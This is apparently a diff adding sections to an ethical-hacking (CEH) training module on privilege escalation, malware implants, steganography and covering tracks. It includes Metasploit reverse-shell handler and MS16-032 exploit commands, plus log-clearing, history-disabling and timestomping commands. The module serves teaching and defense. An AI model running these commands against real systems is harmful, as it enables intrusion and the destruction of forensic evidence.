+                <p>When configuration-based paths are exhausted, an unpatched kernel vulnerability offers a direct route: a flaw in a kernel-mode driver or the Windows kernel itself lets a user-mode process execute code in kernel context, which is by definition SYSTEM-equivalent. Historically significant examples include MS16-032 (the secondary-logon handle flaw referenced in the Metasploit lab below) and the various PrintNightmare spooler vulnerabilities.</p>
+                <p>Kernel exploits are powerful but carry real risk: a failed or unstable <span class="term" data-term="exploit">exploit</span> can crash the target (a bugcheck / blue screen), which is both operationally disruptive and extremely noisy. Experienced operators treat them as a last resort, after configuration-based escalation has been ruled out, precisely because the configuration paths are quieter and more reliable. The defense is unglamorous but decisive — patch management. A fully-patched host simply does not have the vulnerable driver, and the exploit fails.</p>
+
+                <div class="lab-container">
+                    <div class="lab-header">
+                        <h4>🧪 Metasploit Privilege Escalation Lab</h4>
+                        <button class="lab-btn" data-action="startLab" data-args='["metasploitPrivEsc"]'>Start Lab</button>
+                    </div>
+                    <p>The <code>local_exploit_suggester</code> module automates the "which kernel exploit applies here?" question by comparing the target's patch level against Metasploit's exploit database. This is the workflow an attacker uses after establishing an initial Meterpreter session — enumerate, then let the framework suggest the applicable kernel flaws.</p>
+                    <div class="code-block"># Establish the initial (low-privilege) session
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+exploit
+
+# From the session, ask the framework which local exploits fit this host
+background
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+
+# Run a suggested exploit — here, the MS16-032 kernel flaw
+use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+set SESSION 1
+exploit</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Linux privilege escalation</h3>
+                <p>The Linux escalation surface is organized around the same principle — find the thing already misconfigured — but the specific vectors differ. Four dominate in both exams and real assessments.</p>
+                <div class="grid-2">
+                    <div class="feature-card">
+                        <h4>SUID/SGID binaries</h4>
+                        <p>A binary with the SUID bit runs with the privileges of its <em>owner</em> (often root) regardless of who executes it. This is legitimate for tools like <code>passwd</code>, but a SUID binary that can be coerced into running arbitrary commands — or a non-standard SUID binary left by an administrator — becomes a root shell. The site <strong>GTFOBins</strong> catalogs exactly which common binaries can be abused this way and how.</p>
+                        <div class="code-block">find / -perm -4000 -type f 2&gt;/dev/null</div>
+                    </div>
+                    <div class="feature-card">
+                        <h4>Sudo misconfigurations</h4>
+                        <p><code>sudo -l</code> reveals which commands the current user may run as root. If any of them can spawn a shell, read/write arbitrary files, or execute other programs (again, see GTFOBins), that entry is a direct escalation. Even <code>sudo vim</code> or <code>sudo find</code> is enough.</p>
+                        <div class="code-block">sudo -l
+# e.g. "(root) NOPASSWD: /usr/bin/find" -&gt; root shell via find's -exec</div>
+                    </div>
+                    <div class="feature-card">
+                        <h4>Cron jobs</h4>
+                        <p>Scheduled tasks that run as root and execute a script the attacker can modify — or that rely on a writable directory in their <code>PATH</code> — run the attacker's code as root on the next tick. Look for world-writable scripts referenced by root's crontab.</p>
+                        <div class="code-block">cat /etc/crontab
+ls -la /etc/cron.*</div>
+                    </div>
+                    <div class="feature-card">
+                        <h4>Kernel exploits</h4>
+                        <p>As on Windows, an unpatched kernel is a direct route — Dirty COW and its successors are the well-known examples. <code>uname -a</code> gives the version; <strong>linux-exploit-suggester</strong> matches it against known local exploits. Same trade-off applies: powerful, but riskier and noisier than a configuration win.</p>
+                        <div class="code-block">uname -a
+./linux-exploit-suggester.sh</div>
+                    </div>
+                </div>
+                <p>The enumeration tools that automate this — <strong>LinPEAS</strong>, <strong>LinEnum</strong>, <strong>BeRoot</strong>, and <strong>linux-exploit-suggester</strong> — each walk these surfaces and highlight likely wins. As with their Windows counterparts, the value for a student is in understanding <em>what</em> they flag and why each finding is exploitable, because that understanding is what the exam tests and what real assessment work requires.</p>
+            </div>
+
+            <div class="card">
+                <h3>Key takeaways</h3>
+                <ul>
+                    <li>Escalation is an <strong>information problem</strong>: the weakness is usually already on the host, and enumeration — not exploitation — is where the work is.</li>
+                    <li>On Windows, <code>whoami /priv</code> is the first move; <code>SeImpersonatePrivilege</code> is the most commonly abused right and leads to SYSTEM via the version-appropriate Potato tool.</li>
+                    <li><strong>Tool choice depends on OS version</strong> — JuicyPotato for older builds, PrintSpoofer/RoguePotato/GodPotato for 1809 and newer. A "failed" escalation is often just the wrong tool for the version.</li>
+                    <li>Service misconfigurations (unquoted paths, weak binary/config permissions) and UAC bypasses are quieter and more reliable than kernel exploits, which are a noisy last resort.</li>
+                    <li>On Linux, the big four are SUID/SGID binaries, <code>sudo</code> rules, cron jobs, and kernel exploits — GTFOBins is the reference for abusing the first two.</li>
+                    <li>Nearly every defense reduces to the same three disciplines: <strong><span class="term" data-term="least privilege">least privilege</span></strong> (don't grant powerful tokens to reachable accounts), <strong>patch management</strong> (closes kernel and version-specific paths), and <strong>configuration auditing</strong> (the same tools attackers run will show defenders their exposure).</li>
+                </ul>
+            </div>
+
+            <button class="btn btn-success" data-action="showSection" data-args='["execution"]'>Next → Executing Applications</button>
+        </section>
+
+        <!-- Execution Section -->
+        <section id="execution" class="module-section" role="tabpanel" aria-labelledby="tab-execution" tabindex="0" hidden="">
+            <h2 class="section-title">⚡ Executing Applications</h2>
+
+            <div class="card">
+                <h3>Turning access into a productive foothold</h3>
+                <p>Once an attacker has gained access and escalated privileges, a transient shell is not yet an objective achieved. The "executing applications" phase is where they install the tooling that makes the compromise <em>useful</em> and <em>durable</em>: software to capture what the user types, exfiltrate their data, and — most importantly — guarantee a way back in even if the original entry point is closed. This is the stage where an intrusion becomes an infestation. The four categories below are distinct in purpose, and CEH expects you to tell them apart cleanly, but real-world implants routinely combine several: a modern remote-access <span class="term" data-term="trojan">trojan</span> may bundle a keylogger, a rootkit to hide itself, and a backdoor for persistence in one package.</p>
+            </div>
+
+            <div class="card">
+                <h3>Keyloggers</h3>
+                <p>A keylogger records every keystroke a user types, capturing passwords, messages, and any other typed data at the moment of entry — before encryption, before hashing, in the clear. That "before encryption" point is what makes them so valuable: a keylogger sidesteps every cryptographic protection a system has by catching the secret as the human types it. They come in two families with very different detection profiles.</p>
+                <div class="grid-2">
+                    <div class="feature-card">
+                        <h4>💻 Software keyloggers</h4>
+                        <p>Programs that intercept keystrokes at some level of the operating system. A <strong>user-mode</strong> keylogger uses a documented API such as Windows' <code>SetWindowsHookEx</code> to hook the keyboard event chain — easy to build, but visible to security tooling. A <strong>kernel-mode</strong> keylogger runs as a driver and intercepts input far lower in the stack, which is stealthier but harder to write and requires the privilege to load a driver. A <strong>form-grabber</strong> variant hooks the browser specifically, capturing web form submissions before <span class="term" data-term="tls">TLS</span> encrypts them.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>🔌 Hardware keyloggers</h4>
+                        <p>A physical device inserted between the keyboard and the computer, storing keystrokes in internal memory for later retrieval. Because they are entirely external to the operating system, <strong>no software-based detection can see them</strong> — antivirus, EDR, and <span class="term" data-term="integrity">integrity</span> checkers are all blind to a device on the wire. The only defense is physical: inspecting ports on high-security machines. They require physical access to install, which limits them to insider or targeted scenarios.</p>
+                    </div>
+                </div>
+                <p><strong>Detection and defense.</strong> Software keyloggers exhibit behavioral indicators — a process hooking the keyboard, then periodically writing to a file or making network connections to exfiltrate the log — that EDR products and network monitoring can catch. Multi-factor authentication blunts their primary payoff, since a captured password alone is insufficient. Hardware keyloggers require physical inspection, which is why sensitive environments control physical access to endpoints.</p>
+            </div>
+
+            <div class="card">
+                <h3>Spyware</h3>
+                <p>Spyware is a broader category of software that covertly gathers information about a user or organization and relays it to the attacker. Where a keylogger is narrowly focused on keystrokes, spyware may capture screenshots, harvest browser history and stored credentials, record audio or video, track location, and inventory files. The defining characteristic is stealthy exfiltration — it is designed to collect and transmit without the victim's awareness, often for months. Modern infostealers, a prominent spyware subtype, specialize in scraping saved passwords, session cookies, and cryptocurrency wallets, and have become a major driver of account-takeover attacks. The defensive posture mirrors keyloggers: behavioral detection of the collection-and-exfiltration pattern, plus network monitoring for the data leaving.</p>
+            </div>
+
+            <div class="card">
+                <h3>Backdoors and remote-access trojans</h3>
+                <p>A <strong>backdoor</strong> is any mechanism that provides covert, reliable re-entry to a compromised system, bypassing normal authentication. Its purpose is persistence: even if the defender patches the original vulnerability or resets the cracked password, the backdoor lets the attacker return. Backdoors range from crude (a hidden administrator account, a scheduled task that phones home) to sophisticated (a modified system binary, a malicious kernel module). On Linux, the Quasar/QLNX implant family illustrates the modern approach — a PAM backdoor that subverts the authentication module itself, so the attacker can log in as any user with a magic password while legitimate authentication continues to work normally.</p>
+                <p>A <strong>remote-access trojan (RAT)</strong> is a backdoor with a full remote-control capability attached — file transfer, command execution, screen viewing, webcam and microphone access, all driven from the attacker's console. RATs are the Swiss-army implant of post-exploitation, and they frequently bundle keylogging, credential harvesting, and rootkit concealment. The distinction the exam wants: a backdoor guarantees <em>access</em>; a RAT guarantees access <em>plus interactive control</em>.</p>
+                <div class="warning-box">
+                    <p><strong>Persistence is where defenders get a second chance.</strong> Establishing persistence almost always leaves an artifact — a new service, a scheduled task, a registry Run key, a modified <code>ld.so.preload</code>, an added SSH key. These persistence locations are finite and well-catalogued (MITRE ATT&amp;CK's Persistence tactic enumerates them), which is exactly why hunting for unexpected entries in them is one of the highest-yield defensive activities.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Rootkits: hiding the whole operation</h3>
+                <p>A rootkit is the concealment layer that hides the keyloggers, spyware, and backdoors above from users, administrators, and security tools. It is not itself an entry vector — it is post-exploitation <span class="term" data-term="malware">malware</span> whose entire job is stealth and persistence. Rootkits are classified by the privilege level at which they operate, and the level determines both their power and how hard they are to find.</p>
+                <div class="grid-2">
+                    <div class="feature-card">
+                        <h4>User-mode rootkits</h4>
+                        <p>Operate at the same level as ordinary programs, hooking API calls in memory to hide files and processes belonging to the attacker. Easier to deploy, but because they live in userspace, kernel-level security tools and EDR can detect them relatively reliably.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>Kernel-mode rootkits</h4>
+                        <p>Run as a driver inside the OS kernel, hooking or patching system calls at the deepest software level. Far more powerful and far harder to detect — a rootkit at this level can lie to any security tool that asks the OS a question, because it <em>is</em> the part of the OS answering. Detecting them reliably requires looking from outside the compromised OS.</p>
+                    </div>
+                </div>
+                <p>Beyond these two, more insidious variants exist — <strong>bootkits</strong> that load before the OS by infecting the boot record, and <strong>firmware/hardware rootkits</strong> that survive even an OS reinstall. On Linux, a common technique is <code>LD_PRELOAD</code> / <code>ld.so.preload</code> hijacking, which forces every program to load a malicious library that intercepts standard C-library functions.</p>
+            </div>
+
+            <div class="card">
+                <h3>Detecting what is designed to be invisible</h3>
+                <p>The defining challenge of this whole category is that a sufficiently privileged rootkit can subvert any detection that trusts the operating system, because it controls the operating system's answers. This shapes how defenders approach it:</p>
+                <ul>
+                    <li><strong>Cross-view / offline analysis.</strong> Compare what the live OS reports against ground truth gathered another way — booting from clean external media, or reading raw disk and memory — so a lying kernel cannot hide the discrepancy.</li>
+                    <li><strong>Memory forensics.</strong> Rootkits must exist in memory to run; dumping and analyzing RAM can reveal hooks and hidden processes the live OS conceals.</li>
+                    <li><strong>Boot and firmware integrity.</strong> Secure Boot and measured-boot mechanisms defend the layers below the OS where bootkits and firmware rootkits hide.</li>
+                    <li><strong>Behavioral EDR.</strong> Even a stealthy implant eventually <em>does</em> something — makes a network connection, spawns a process, writes a file — and behavior-based detection catches the action even when the artifact is hidden.</li>
+                    <li><strong>Least privilege and driver signing.</strong> Kernel rootkits require the ability to load a driver; enforcing driver signing and denying that privilege closes the door on the most dangerous class.</li>
+                </ul>
+                <p>The practical lesson: prevention (least privilege, patching, driver-signing enforcement) is far cheaper than detection once a kernel rootkit is installed. The strongest response to a confirmed kernel-level compromise is often to rebuild the host from known-good media rather than attempt cleaning, because you can never fully trust a system whose kernel has been subverted.</p>
+            </div>
+
+            <button class="btn btn-success" data-action="showSection" data-args='["steganography"]'>Next → Steganography &amp; Data Hiding</button>
+        </section>
+
+        <!-- Steganography Section -->
+        <section id="steganography" class="module-section" role="tabpanel" aria-labelledby="tab-steganography" tabindex="0" hidden="">
+            <h2 class="section-title">🖼️ Steganography &amp; Data Hiding</h2>
+
+            <div class="card">
+                <h3>Hiding in plain sight</h3>
+                <p>Cryptography and steganography solve different problems and are often confused. <strong>Cryptography</strong> scrambles a message so that anyone who intercepts it cannot read it — but they can see that <em>something encrypted</em> exists, which is itself information. <strong>Steganography</strong> hides the very existence of the message, concealing it inside something ordinary and unremarkable so that no observer suspects there is anything to look for. An encrypted file screams "secret"; a steganographic payload looks like a vacation photo. In an attack, the two are frequently combined: encrypt the data first, then hide the ciphertext, so that even if the hiding is discovered the content is still protected.</p>
+                <p>For an attacker, steganography serves two goals in the system-hacking phase. It <strong>conceals tooling</strong> on disk — a payload embedded in an image file survives a casual review that would flag a suspicious executable. And it enables <strong>covert exfiltration</strong> — stealing data by hiding it inside innocuous files (images posted to a social account, audio uploaded to a sharing site) that sail past data-loss-prevention systems watching for obvious secrets leaving the network.</p>
+            </div>
+
+            <div class="card">
+                <h3>How it works: the least-significant-bit technique</h3>
+                <p>The most common and most teachable method is <strong>least significant bit (LSB) substitution</strong>, and understanding it demystifies the whole field. A digital image stores each pixel as color values — for example, three bytes for red, green, and blue. The <em>least significant</em> bit of each byte contributes almost nothing to the color a human perceives: flipping it changes a red value from 200 to 201, a difference no eye can detect. Steganography exploits this slack. By replacing the least significant bit of each color byte with one bit of the hidden message, an attacker can embed a substantial payload — the image looks identical, but its lowest bits now spell out the secret.</p>
+                <div class="info-box">
+                    <p><strong>The capacity trade-off:</strong> a 1920×1080 image has about two million pixels, each with three color bytes, giving roughly six million bits — about 750 KB — of hiding capacity using just one bit per byte, with no visible change. Using more bits per byte increases capacity but eventually produces visible artifacts, which is one of the signatures detection tools look for.</p>
+                </div>
+                <p>The same principle extends beyond images. The carrier just needs redundant, low-perceptibility data to borrow.</p>
+            </div>
+
+            <div class="card">
+                <h3>Carriers: what can hide a payload</h3>
+                <div class="grid-2">
+                    <div class="feature-card">
+                        <h4>🖼️ Image steganography</h4>
+                        <p>The classic carrier. LSB substitution in the color channels of PNG or BMP files (lossless formats preserve the hidden bits; JPEG's compression can destroy them, requiring frequency-domain techniques instead). High capacity, visually undetectable to humans.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>🎵 Audio steganography</h4>
+                        <p>Hides data in the least significant bits of audio samples, or in frequencies outside human hearing, or by exploiting the ear's inability to perceive a quiet tone immediately after a loud one (echo hiding). WAV files are the common lossless carrier.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>🎬 Video steganography</h4>
+                        <p>Combines image and audio techniques across many frames, offering enormous capacity — a video has thousands of images to hide within. Useful for exfiltrating large datasets inside a single innocuous-looking file.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>📝 Text &amp; other carriers</h4>
+                        <p>Lower capacity but subtle: manipulating whitespace, word choice, or formatting to encode bits. Also includes NTFS <strong>alternate data streams</strong>, which let a file secretly carry a second hidden file on Windows — a favorite for concealing payloads.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Tools</h3>
+                <p>A range of tools implement these techniques, from command-line utilities to full applications. <strong>Steghide</strong> embeds and extracts data in image and audio files with optional passphrase encryption. <strong>OpenStego</strong> and older tools like <strong>Snow</strong> (whitespace-based text steganography) and <strong>ImageHide</strong> serve similar roles. On Windows, alternate data streams need no special tool at all — the OS itself creates them with a simple <code>type payload.exe &gt; innocent.txt:hidden.exe</code> style redirection. Knowing the tools by name is an exam expectation; understanding that they all rest on the same "borrow imperceptible slack in a carrier" principle is the durable knowledge.</p>
+            </div>
+
+            <div class="card">
+                <h3>Steganalysis: detecting the hidden</h3>
+                <p>Detecting steganography — <strong>steganalysis</strong> — is genuinely hard, which is precisely why attackers value the technique. Because a well-made steganographic file looks normal, detection relies on statistical and comparative methods rather than simple inspection:</p>
+                <ul>
+                    <li><strong>Statistical analysis.</strong> Embedding data disturbs the natural statistical distribution of a file's bits. LSB substitution, for instance, makes the least significant bits more random than they would naturally be. Tools like <strong>StegExpose</strong> flag these anomalies.</li>
+                    <li><strong>Known-carrier comparison.</strong> If the original, unmodified file is available, comparing it byte-for-byte against the suspect file reveals the changes immediately. This is why attackers use unique, self-generated carriers rather than well-known images.</li>
+                    <li><strong>Signature detection.</strong> Specific tools leave specific artifacts — headers, structural patterns — that can be fingerprinted.</li>
+                    <li><strong>Anomaly heuristics.</strong> An image file that is unexpectedly large for its dimensions, or one whose file type does not match its extension, invites scrutiny.</li>
+                </ul>
+                <p><strong>Defense in practice.</strong> Because reliable detection is difficult, organizations lean on prevention and disruption. Data-loss-prevention systems monitor for large or unusual outbound files. Critically, <strong>re-encoding a file destroys most steganographic payloads</strong> — a gateway that resizes or recompresses every uploaded image will silently obliterate LSB-hidden data without needing to detect it first. This "sanitize rather than detect" approach is often the most practical defense.</p>
+            </div>
+
+            <button class="btn btn-success" data-action="showSection" data-args='["covering-tracks"]'>Next → Covering Tracks</button>
+        </section>
+
+        <!-- Covering Tracks Section -->
+        <section id="covering-tracks" class="module-section" role="tabpanel" aria-labelledby="tab-covering-tracks" tabindex="0" hidden="">
+            <h2 class="section-title">🕵️ Covering Tracks</h2>
+
+            <div class="card">
+                <h3>The final phase — and why it is the loudest</h3>
+                <p>Covering tracks is the attacker's attempt to erase the evidence of everything they have done: the logs that recorded their logins, the command history that captured their actions, the timestamps that would place them at the scene, and the security events that flagged their tools. It comes last in the methodology because it destroys the very trail the attacker has been generating throughout the intrusion. A successful cleanup can turn a detectable breach into an invisible one, delaying discovery for months and crippling any eventual investigation.</p>
+                <p>Yet there is a deep irony that defenders exploit: <strong>the act of covering tracks is itself an event that gets logged</strong>. Clearing a Windows event log generates Event ID 1102 ("the audit log was cleared"). Truncating a Linux log leaves a suspicious gap. Deleting command history is visible to a shell configured to log to a remote server. The attacker is trying to erase a record while standing inside the recording system — and unless they also control where the records are sent, their erasure is recorded too. This is why forwarding logs off-host to a <span class="term" data-term="siem">SIEM</span>, in real time, is one of the most powerful defensive controls in existence: it takes the evidence out of the attacker's reach the instant it is created.</p>
+            </div>
+
+            <div class="card">
+                <h3>What attackers target</h3>
+                <p>Cleanup focuses on four kinds of evidence, and the concepts are the same across operating systems even though the mechanics differ.</p>
+                <div class="grid-2">
+                    <div class="feature-card">
+                        <h4>📋 Log clearing</h4>
+                        <p>Removing or wiping the event and audit logs that record authentication, process creation, and security events. The bluntest approach — clearing an entire log — is also the most detectable, because the clearing itself is recorded and the resulting empty log is conspicuous.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>⏰ Timestamp manipulation</h4>
+                        <p>Altering file MAC times (Modified, Accessed, Created) so that malicious files appear old and unremarkable rather than freshly created during the intrusion — a technique called <strong>timestomping</strong>. It defeats forensic timelines that rely on "what changed around the time of the breach."</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>🗑️ Selective deletion</h4>
+                        <p>Removing specific evidence — dropped tools, downloaded payloads, command history — rather than wiping everything. More surgical and less conspicuous than clearing whole logs, but it requires the attacker to know exactly what they touched.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>🔀 Trail obfuscation</h4>
+                        <p>Rather than deleting, drowning the evidence in noise or misdirection — injecting false entries, routing through intermediaries, or disabling auditing <em>before</em> acting so no record is created in the first place. Disabling logging pre-emptively is stealthier than deleting logs afterward.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Windows track covering</h3>
+                <p>On Windows, the Event Log is the primary target. Attackers clear it with built-in tools (<code>wevtutil cl</code>, or PowerShell's <code>Clear-EventLog</code>), but as noted this generates the tell-tale Event ID 1102. More sophisticated actors manipulate auditing settings via the registry or Group Policy to stop events being recorded in the first place, or use tools that surgically remove individual event records while leaving the log otherwise intact — far harder to spot than a wholesale clear. Timestomping is performed with tools that rewrite the NTFS MAC times on dropped files. The registry itself is both a target (Run keys and other persistence artifacts get cleaned up) and a tool (auditing configuration lives there).</p>
+                <div class="code-block"># Clearing the Security log with the built-in utility — generates Event ID 1102
+wevtutil cl Security
+
+# Listing logs an attacker might target
+wevtutil el</div>
+            </div>
+
+            <div class="card">
+                <h3>Linux track covering</h3>
+                <p>On Linux, the equivalent targets are the text-based logs in <code>/var/log</code> (notably <code>auth.log</code> and <code>syslog</code>), the shell history file (<code>~/.bash_history</code>), and file timestamps. A crude attacker overwrites or truncates a log; a careful one edits out only the lines relating to their activity, or disables history logging for their session before acting. Shell history is a frequent oversight — an attacker who forgets to disable it hands investigators a complete transcript of their commands.</p>
+                <div class="code-block"># Disable history for the current session (stealthier than deleting it later)
+unset HISTFILE
+export HISTSIZE=0
+
+# Timestamp manipulation: make a file's times match a reference file
+touch -r /bin/ls /tmp/malicious_payload
+
+# Truncating a log (crude — leaves a conspicuous gap)
+cat /dev/null &gt; /var/log/auth.log
+            </div>
+            </div>
+
+            <div class="lab-container">
+                <div class="lab-header">
+                    <h4>🧪 Linux Log Clearing Lab</h4>
+                    <button class="lab-btn" data-action="startLab" data-args='["linuxLogClearing"]'>Start Lab</button>
+                </div>
+                <p>This lab walks through the anti-forensic techniques above in a controlled environment — and, just as importantly, shows what evidence survives each one, reinforcing the defender's perspective.</p>
+            </div>
+
+            <div class="card">
+                <h3>Why covering tracks so often fails — the defender's advantage</h3>
+                <p>Track covering is the phase where well-prepared defenders most reliably catch attackers, for a structural reason: the attacker is trying to control a record from inside the system that produces it, and modern logging architectures deliberately move that record beyond their reach. The key defenses:</p>
+                <ul>
+                    <li><strong>Centralized, real-time log forwarding.</strong> If every log is shipped to a SIEM the instant it is written, deleting the local copy accomplishes nothing — the evidence is already gone from the attacker's control. This single measure defeats most track-covering.</li>
+                    <li><strong>Alert on the clearing event itself.</strong> Event ID 1102 (Windows log cleared), sudden log gaps, and history-disabling commands are high-fidelity indicators. The cleanup action becomes the alarm.</li>
+                    <li><strong>Write-once and integrity-protected logs.</strong> Append-only storage and cryptographic log integrity (hashing chains) make silent tampering detectable.</li>
+                    <li><strong>File-integrity monitoring.</strong> Tools that baseline MAC times and file hashes flag timestomping and unexpected modifications that the attacker tried to disguise.</li>
+                    <li><strong>Restricted audit-configuration access.</strong> Preventing non-administrators from altering auditing settings closes the "disable logging before acting" route.</li>
+                </ul>
+                <div class="info-box">
+                    <p><strong>The takeaway that ties the module together:</strong> covering tracks is the attacker's admission that logs are dangerous to them. Everything that makes logs harder to reach, alter, or silence — forwarding, integrity protection, alerting on tampering — directly strengthens your ability to detect every other phase of the attack as well.</p>
+                </div>
+            </div>
+
+            <button class="btn btn-success" data-action="showSection" data-args='["tools"]'>Next → System Hacking Tools</button>
+        </section>
+
+        <!-- Tools Section -->
+        <section id="tools" class="module-section" role="tabpanel" aria-labelledby="tab-tools" tabindex="0" hidden="">
+            <h2 class="section-title">🛠️ System Hacking Tools</h2>
+
+            <div class="card">
+                <h3>How to think about the toolkit</h3>
+                <p>It is tempting to treat a security certification as a list of tools to memorize, but that gets the emphasis backwards. Tools change — they are updated, deprecated, and replaced — while the <em>techniques</em> they implement endure. The right way to learn this toolkit is to attach each tool to the phase it serves and the concept it applies, so that when a tool falls out of favor you can immediately identify its successor. The tools below are grouped by the job they do, and each entry names the underlying technique it automates.</p>
+            </div>
+
+            <div class="card">
+                <h3>Credential access and cracking</h3>
+                <div class="grid-2">
+                    <div class="feature-card">
+                        <h4>Hashcat &amp; John the Ripper</h4>
+                        <p>Offline password cracking (covered in Password Attacks). Hashcat is the GPU-accelerated speed leader; John is the flexible CPU-based generalist. Both implement dictionary, rule-based, and mask attacks against dumped hashes.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>Hydra</h4>
+                        <p>Online credential attacks against live network services — SSH, RDP, FTP, HTTP forms. Implements dictionary and brute-force guessing where lockout policies are weak.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>Mimikatz</h4>
+                        <p>The definitive Windows credential-extraction tool. Reads plaintext passwords, hashes, and Kerberos tickets from <code>lsass.exe</code> memory; enables pass-the-hash and pass-the-ticket attacks. Requires <code>SeDebugPrivilege</code> — which ties it directly to the escalation phase.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>Responder</h4>
+                        <p>Poisons Windows name-resolution (LLMNR/NBT-NS) to capture NetNTLMv2 authentication exchanges off the network, which are then cracked offline. A passive-capture technique rather than a guessing one.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Exploitation and escalation</h3>
+                <div class="grid-2">
+                    <div class="feature-card">
+                        <h4>Metasploit Framework</h4>
+                        <p>The all-purpose exploitation platform: delivers payloads, manages Meterpreter sessions, and — via <code>local_exploit_suggester</code> — automates the search for applicable privilege-escalation exploits. Central to gaining access and escalating.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>WinPEAS &amp; LinPEAS / PowerUp</h4>
+                        <p>Escalation enumeration. These walk the entire privilege-escalation surface on Windows and Linux and flag likely wins — misconfigured services, dangerous privileges, writable files. As useful to defenders auditing their own hosts as to attackers.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>PrintSpoofer / GodPotato</h4>
+                        <p>Token-impersonation exploits that abuse <code>SeImpersonatePrivilege</code> to reach SYSTEM on modern Windows (the successors to JuicyPotato). The specific tool depends on the OS build.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>Impacket suite</h4>
+                        <p>A collection of Python tools for Windows network protocols — <code>secretsdump</code> (remote hash extraction), <code>psexec</code>/<code>wmiexec</code> (remote execution), and more. The connective tissue of Windows post-exploitation.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Concealment and detection</h3>
+                <div class="grid-2">
+                    <div class="feature-card">
+                        <h4>GMER &amp; rootkit scanners</h4>
+                        <p>A defensive tool: detects kernel-mode rootkits by cross-view analysis — comparing what the OS reports against what it finds by inspecting lower-level structures directly, exposing the discrepancies a rootkit creates.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>Steghide / OpenStego</h4>
+                        <p>Steganography tools that embed and extract hidden payloads in image and audio carriers (covered in the Steganography section), optionally with passphrase encryption.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>The dual-use reality</h3>
+                <p>Nearly every tool in this list serves both attacker and defender. WinPEAS finds an escalation path for a penetration tester and closes it for a system administrator. GMER hunts rootkits for a blue team. Mimikatz demonstrates credential exposure so an organization can deploy Credential Guard against it. This is the essence of ethical hacking: the same knowledge that enables an attack enables its defense, and the value of learning the offensive tool is that it teaches you exactly what to watch for and what to harden. A defender who has never run these tools is defending against an attacker they cannot picture.</p>
+            </div>
+
+            <button class="btn btn-success" data-action="showSection" data-args='["labs"]'>Next → Hands-on Laboratories</button>
+        </section>
+
+        <!-- Labs Section -->
+        <section id="labs" class="module-section" role="tabpanel" aria-labelledby="tab-labs" tabindex="0" hidden="">
+            <h2 class="section-title">🧪 Hands-on Laboratories</h2>
+            
+            <div class="card">
+                <h3>🎯 Laboratory Overview</h3>
+                <p>The CEH curriculum emphasizes practical experience, and Module 6 is no exception. Through hands-on labs, learners get to apply the concepts in a controlled environment, using tools and techniques for system hacking, detection, and defense. This practical approach ensures that Ethical Hackers can grasp the theoretical aspects and apply them in real-world scenarios, such as penetration testing or vulnerability assessments.</p>
+            </div>
+
+            <div class="technique-grid">
+                <div class="technique-card" data-action="startLab" data-args='["passwordCracking"]'>
+                    <h4>🔐 Lab 1: Password Cracking</h4>
+                    <p><strong>Duration:</strong> 45 minutes</p>
+                    <p>Dictionary and brute force attacks</p>
+                    <ul style="margin: 10px 0; padding-left: 20px;">
+                        <li>John the Ripper usage</li>
+                        <li>Hydra network attacks</li>
+                        <li><span class="term" data-term="rainbow table">Rainbow table</span> attacks</li>
+                    </ul>
+                </div>
+
+                <div class="technique-card" data-action="startLab" data-args='["privilegeEscalation"]'>
+                    <h4>⬆️ Lab 2: Privilege Escalation</h4>
+                    <p><strong>Duration:</strong> 60 minutes</p>
+                    <p>Windows and Linux escalation</p>
+                    <ul style="margin: 10px 0; padding-left: 20px;">
+                        <li>Metasploit exploitation</li>
+                        <li>Local exploits</li>
+                        <li>Misconfiguration abuse</li>
+                    </ul>
+                </div>
+
+                <div class="technique-card" data-action="startLab" data-args='["keyloggerDeployment"]'>
+                    <h4>⌨️ Lab 3: Keylogger Deployment</h4>
+                    <p><strong>Duration:</strong> 30 minutes</p>
+                    <p>Monitor user activities</p>
+                    <ul style="margin: 10px 0; padding-left: 20px;">
+                        <li>Software keylogger installation</li>
+                        <li>Data collection</li>
+                        <li>Detection evasion</li>
+                    </ul>
+                </div>
+
+                <div class="technique-card" data-action="startLab" data-args='["steganographyLab"]'>
+                    <h4>🖼️ Lab 4: Steganography</h4>
+                    <p><strong>Duration:</strong> 40 minutes</p>
+                    <p>Data hiding and extraction</p>
+                    <ul style="margin: 10px 0; padding-left: 20px;">
+                        <li>Image steganography</li>
+                        <li>Text hiding techniques</li>
+                        <li>Steganalysis methods</li>
+                    </ul>
+                </div>
+
+                <div class="technique-card" data-action="startLab" data-args='["coveringTracksLab"]'>
+                    <h4>🕵️ Lab 5: Covering Tracks</h4>
+                    <p><strong>Duration:</strong> 35 minutes</p>
+                    <p>Evidence removal techniques</p>
+                    <ul style="margin: 10px 0; padding-left: 20px;">
+                        <li>Log clearing</li>
+                        <li>File secure deletion</li>
+                        <li>Timestamp manipulation</li>
+                    </ul>
+                </div>
+
+                <div class="technique-card" data-action="startLab" data-args='["comprehensiveScenario"]'>
+                    <h4>🎯 Lab 6: Comprehensive Scenario</h4>
+                    <p><strong>Duration:</strong> 90 minutes</p>
+                    <p>End-to-end system hacking</p>
+                    <ul style="margin: 10px 0; padding-left: 20px;">
+                        <li>Full attack lifecycle</li>
